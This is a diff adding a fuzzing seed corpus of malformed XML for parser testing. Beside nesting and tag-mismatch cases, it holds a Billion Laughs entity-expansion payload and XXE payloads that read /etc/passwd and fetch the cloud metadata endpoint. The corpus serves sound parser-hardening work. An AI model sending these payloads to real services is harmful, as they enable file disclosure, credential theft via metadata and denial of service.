@@ -1,0 +1,21 @@
+# Extensively malformed XML seed corpuses
+# Use for structure-aware parsing/XXE/DoS fuzzing
+
+# Valid Baseline
+<?xml version="1.0"?><data><user id="1">admin</user></data>
+
+# Entity Expansion (Billion Laughs DoS)
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE lolz [ <!ENTITY lol "lol"><!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;"> ]><lolz>&lol2;</lolz>
+
+# External Entity Reference (XXE)
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/" >]><foo>&xxe;</foo>
+
+# Malformed Namespaces & Depth
+<root xmlns:a="http://a" xmlns:b="urn:b"><a:doc><b:doc></b:doc></a:doc></root>
+<a:a><a:a><a:a><a:a><a:a></a:a></a:a></a:a></a:a></a:a>
+
+# Boundary / Tag Confusion
+<tag>text</TAG>
+<tag attr="value'/>
+<<abc>>
